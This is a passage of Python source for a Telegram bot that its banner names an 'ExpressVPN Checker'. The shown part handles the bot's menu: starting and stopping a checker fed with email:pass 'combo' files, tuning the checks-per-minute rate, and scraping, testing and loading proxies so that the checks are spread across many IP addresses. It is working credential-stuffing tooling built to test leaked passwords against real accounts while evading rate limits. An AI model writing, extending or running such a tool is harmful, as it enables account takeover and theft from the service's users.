                    cc = "\n".join(engine.custom_list)
                    bio2 = io.BytesIO(cc.encode("utf-8"))
                    bio2.name = f"Custom_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
                    await context.bot.send_document(
                        chat_id=chat_id, document=InputFile(bio2),
                        caption=f"🔶 {MB(f'{len(engine.custom_list)} Custom Results')}",
                    )

        def sync_cb(res):
            asyncio.run_coroutine_threadsafe(live_update(res), context.application.loop)

        engine.run(combos, callback=sync_cb)

    # ── Stats ──
    elif data == "stats":
        await q.edit_message_text(build_stats(engine), reply_markup=kb_back())

    # ── Stop ──
    elif data == "stop_check":
        if engine.running:
            engine.stop()
            await q.edit_message_text(f"⏹ {MB('Checker stopped.')}", reply_markup=kb_main())
        else:
            await q.edit_message_text(f"⚠️ {MB('No checker running.')}", reply_markup=kb_main())

    # ── Settings ──
    elif data == "settings":
        await q.edit_message_text(
            f"⚙️ {MB('Settings')}\n\n⚡ {MB('CPM')}: {sess['cpm']}",
            reply_markup=kb_settings(sess["cpm"]),
        )

    elif data == "cpm_up":
        sess["cpm"] = min(sess["cpm"] + 5, MAX_CPM)
        await q.edit_message_text(f"⚙️ {MB('Settings')}\n\n⚡ {MB('CPM')}: {sess['cpm']}", reply_markup=kb_settings(sess["cpm"]))

    elif data == "cpm_dn":
        sess["cpm"] = max(sess["cpm"] - 5, 1)
        await q.edit_message_text(f"⚙️ {MB('Settings')}\n\n⚡ {MB('CPM')}: {sess['cpm']}", reply_markup=kb_settings(sess["cpm"]))

    elif data == "cpm_up10":
        sess["cpm"] = min(sess["cpm"] + 10, MAX_CPM)
        await q.edit_message_text(f"⚙️ {MB('Settings')}\n\n⚡ {MB('CPM')}: {sess['cpm']}", reply_markup=kb_settings(sess["cpm"]))

    elif data == "cpm_dn10":
        sess["cpm"] = max(sess["cpm"] - 10, 1)
        await q.edit_message_text(f"⚙️ {MB('Settings')}\n\n⚡ {MB('CPM')}: {sess['cpm']}", reply_markup=kb_settings(sess["cpm"]))

    elif data == "cur_cpm":
        await q.answer(f"Current CPM: {sess['cpm']}", show_alert=True)

    # ━━━ Proxy Menu ━━━
    elif data == "proxy_menu":
        px = len(sess.get("proxies", []))
        await q.edit_message_text(
            f"🌐 {MB('Proxy Manager')}\n\n"
            f"📡 {MB('Loaded')}: {px}\n"
            f"🔍 {MB('Scraped')}: {len(sess.get('scraped_proxies', []))}\n"
            f"✅ {MB('Alive')}: {len(sess.get('alive_proxies', []))}\n\n"
            f"{MB('Scrape')} → {MB('Check')} → {MB('Set or Download')}",
            reply_markup=kb_proxy(),
        )

    # ── Scrape ──
    elif data == "proxy_scrape":
        if scraper.scraping:
            await q.answer(f"{MB('Already scraping...')}", show_alert=True)
            return

        await q.edit_message_text(
            f"🔍 {MB('Scraping proxies from')} {len(PROXY_SOURCES)} {MB('sources...')}\n"
            f"⏳ {MB('Please wait...')}",
        )

        scraped = await scraper.scrape()
        sess["scraped_proxies"] = scraped

        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"✅ {MB('Scraping Complete!')}\n\n"
                f"🌐 {MB('Total Scraped')}: {fmt_num(len(scraped))}\n"
                f"📡 {MB('Sources')}: {len(PROXY_SOURCES)}\n\n"
                f"➡️ {MB('Now hit Check Proxies to verify them.')}"
            ),
            reply_markup=kb_proxy(),
        )

    # ── Check Proxies ──
    elif data == "proxy_check":
        to_check = sess.get("scraped_proxies", [])
        if not to_check:
            await q.answer(f"{MB('No scraped proxies. Scrape first!')}", show_alert=True)
            return

        if scraper.checking:
            await q.answer(f"{MB('Already checking...')}", show_alert=True)
            return

        status_msg = await q.edit_message_text(
            f"✅ {MB('Checking')} {fmt_num(len(to_check))} {MB('proxies...')}\n"
            f"⏳ {MB('This may take a while...')}\n\n"
            f"🧵 {MB('Threads')}: {MAX_PROXY_CHECK_THREADS}",
        )

        last_edit = {"time": 0}

        def progress_cb():
            now = time.time()
            if now - last_edit["time"] < 5:
                return
            last_edit["time"] = now
            s = scraper
            p = round((s.check_progress / max(s.check_total, 1)) * 100, 1)
            bl = 20
            fl = int(p / 100 * bl)
            bar = "█" * fl + "░" * (bl - fl)
            txt = (
                f"🔄 {MB('Checking Proxies...')}\n\n"
                f"[{bar}] {p}%\n"
                f"✅ {MB('Alive')}: {len(s.alive)} | ❌ {MB('Dead')}: {len(s.dead)}\n"
                f"📊 {s.check_progress}/{s.check_total}"
            )
            try:
                asyncio.run_coroutine_threadsafe(
                    context.bot.edit_message_text(txt, chat_id=chat_id, message_id=status_msg.message_id),
                    context.application.loop
                )
            except: pass

        def run_check():
            scraper.check_proxies(to_check, callback=progress_cb)

        loop = context.application.loop

        def after_check():
            alive = scraper.alive
            dead = scraper.dead
            sess["alive_proxies"] = alive

            txt = (
                f"🏁 {MB('Proxy Check Complete!')}\n\n"
                f"✅ {MB('Alive')}: {fmt_num(len(alive))}\n"
                f"❌ {MB('Dead')}: {fmt_num(len(dead))}\n"
                f"📊 {MB('Total')}: {fmt_num(len(to_check))}\n"
                f"📈 {MB('Success Rate')}: {round(len(alive) / max(len(to_check), 1) * 100, 1)}%\n\n"
                f"🔧 {MB('Would you like to set these as bot proxies?')}"
            )
            asyncio.run_coroutine_threadsafe(
                context.bot.send_message(chat_id=chat_id, text=txt, reply_markup=kb_proxy_set()),
                loop
            )

        def thread_run():
            run_check()
            after_check()

        threading.Thread(target=thread_run, daemon=True).start()

    # ── Set proxies YES ──
    elif data == "proxy_set_yes":
        alive = sess.get("alive_proxies", [])
        if alive:
            sess["proxies"] = alive
            await q.edit_message_text(
                f"✅ {MB(f'{fmt_num(len(alive))} alive proxies set as bot proxies!')}\n\n"
                f"🚀 {MB('Ready to check combos with proxies.')}",
                reply_markup=kb_main(),
            )
        else:
            await q.edit_message_text(f"❌ {MB('No alive proxies available.')}", reply_markup=kb_proxy())

    # ── Set proxies NO (send file) ──
    elif data == "proxy_set_no":
        alive = sess.get("alive_proxies", [])
        if alive:
            content = "\n".join(alive)
            bio = io.BytesIO(content.encode("utf-8"))
            bio.name = f"alive_proxies_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
            await q.edit_message_text(f"📤 {MB('Sending alive proxies file...')}")
            await context.bot.send_document(
                chat_id=chat_id, document=InputFile(bio),
                caption=f"✅ {fmt_num(len(alive))} {MB('Alive Proxies')} | {CREATOR}",
                reply_markup=kb_main(),
            )
        else:
            await q.edit_message_text(f"❌ {MB('No alive proxies.')}", reply_markup=kb_proxy())

    # ── Upload Proxy ─��
    elif data == "proxy_upload":
        sess["state"] = "proxy_upload"
        await q.edit_message_text(
            f"📤 {MB('Send your proxy TXT file.')}\n\n"
            f"{MB('Format')}:\n"
            f"ip:port\n"
            f"ip:port:user:pass",
            reply_markup=kb_back(),
        )

    # ── Clear Proxy ──
    elif data == "proxy_clear":
        sess["proxies"] = []
        sess["scraped_proxies"] = []
        sess["alive_proxies"] = []
        await q.edit_message_text(f"🗑 {MB('All proxies cleared.')}", reply_markup=kb_main())

    # ── Proxy Stats ──
    elif data == "proxy_stats":
        px = sess.get("proxies", [])
        sc = sess.get("scraped_proxies", [])
        al = sess.get("alive_proxies", [])
        await q.edit_message_text(
            f"📊 {MB('Proxy Statistics')}\n\n"
            f"📡 {MB('Loaded (Active)')}: {fmt_num(len(px))}\n"
            f"🔍 {MB('Scraped')}: {fmt_num(len(sc))}\n"
            f"✅ {MB('Alive')}: {fmt_num(len(al))}\n"
            f"❌ {MB('Dead Removed')}: {fmt_num(len(sc) - len(al)) if sc else 0}",
            reply_markup=kb_proxy(),
        )

    # ── Help ──
    elif data == "help":
        h = (
            f"📖 {MB('Help Guide')}\n\n"
            f"1️⃣ {MB('Send TXT combo file')}\n"
            f"2️⃣ {MB('Adjust CPM in Settings')}\n"
            f"3️⃣ {MB('Scrape + Check Proxies')}\n"
            f"4️⃣ {MB('Hit Start Check')}\n\n"
            f"📌 {MB('Format')}: email:pass\n"
            f"📌 {MB('Large files supported')}\n\n"
            f"👨‍💻 {CREATOR} | 📢 {CHANNEL}"
        )
        await q.edit_message_text(h, reply_markup=kb_back())

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Bot error: {context.error}", exc_info=context.error)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 𝗠𝗔𝗜𝗡
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    print(f"""
╔══════════════════════════════════════════════╗
║   {MB('ExpressVPN Checker Telegram Bot')}       ║
║   {MB('Creator')}: {CREATOR}                         ║
║   {MB('Channel')}: {CHANNEL}                        ║
╠══════════════════════════════════════════════╣
║   🚀 {MB('Bot is starting...')}                     ║
╚══════════════════════════════════════════════╝
    """)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()